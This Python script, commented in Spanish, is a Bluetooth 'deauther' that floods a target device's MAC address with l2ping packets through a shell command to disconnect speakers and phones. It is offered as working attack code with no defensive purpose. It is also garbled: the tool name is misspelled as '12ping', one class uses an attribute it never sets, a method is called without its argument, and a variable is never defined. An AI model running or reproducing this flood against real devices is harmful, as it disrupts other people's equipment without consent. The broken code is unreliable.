import subprocess
from Scanner import Scanner
from constants import PHONE_BRANDS, SPEAKER_BRANDS, SPEAKER_KEYWORDS

class Deauther:
    def __init__(self, adapter='hci1'):
        self.adapter = adapter


    def deauth_device(self, device_mac):
        """ Intento de deauth un dispositivo Bluetooth usando l2ping flood """
        try:
            command = f"sudo 12ping -i {self.adapter} -f {device_mac}"
            print(f"Enviando un ataque flood a {device_mac} via adapter {self.adapter}...")
            # esto se corre en background para que sea continuo
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            # opcionalmente podemos almacenar el proceso y terminarlo despues
            return True
        except FileNotFoundError:
            print("Error: comando l2ping no encontrado. Verifique que este isntalado.")
            return False
        except Exception as e:
            print(f"Un error ocurrio durante la deautenticacion: {e}.")
            return False
            
# Speaker Deauthorizer
class SpeakerDeauthorizer:
    def __init__(self, scanner, disconnector):
        self.scanner = scanner
        self.disconnector = disconnector


    def deauth_device(self, device_mac):
        """ Intento de deauth un dispositivo Bluetooth usando l2ping flood """
        try:
            command = f"sudo 12ping -i {self.adapter} -f {device_mac}"
            print(f"Enviando un ataque flood a {device_mac} via adapter {self.adapter}...")
            # esto se corre en background para que sea continuo
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            # opcionalmente podemos almacenar el proceso y terminarlo despues
            return True
        except FileNotFoundError:
            print("Error: comando l2ping no encontrado. Verifique que este isntalado.")
            return False
        except Exception as e:
            print(f"Un error ocurrio durante la deautenticacion: {e}.")
            return False

if __name__ == "__main__":

    from constants import PHONE_BRANDS, SPEAKER_BRANDS, SPEAKER_KEYWORDS 

    adapter_name = 'hci1'
    scanner = Scanner(adapter=adapter_name)
    deauther = Deauther
    speaker_deauther = SpeakerDeauthorizer(scanner,deauther)
    speaker_deauther.deauth_device() #///  speaker_mac

    print("\n--- Scaneando mobile phones ---")
    found_phones = scanner.scan_for_devices(major_device_class=2)
    if found_phones:
        print("\nLista de MAC AddressesMobile Phones")
        print(phone_address)
    else:
        print("\nNo phones encontrados")
